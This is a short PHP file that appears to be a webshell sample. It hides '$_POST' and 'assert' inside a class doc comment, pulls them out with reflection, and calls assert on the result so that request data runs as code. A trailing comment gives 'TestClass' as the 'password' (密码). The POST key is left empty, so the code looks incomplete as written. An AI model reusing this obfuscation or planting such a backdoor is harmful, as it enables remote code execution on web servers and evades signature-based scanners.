<?php  
/**   
* $a=$_POST[];  
* assert  
*/ 
$a='';  
class TestClass { }  
$rc = new ReflectionClass('TestClass');  
$str=$rc->getDocComment();  
$pos=strpos($str,'$a');  
$eval=substr($str,$pos,15);  
$pos=strpos($str,'assert');  
$fun=substr($str,$pos,6);  
echo $eval;  
$fun($eval);  
echo $a;  
$fun($a);  
?> 
//密码TestClass
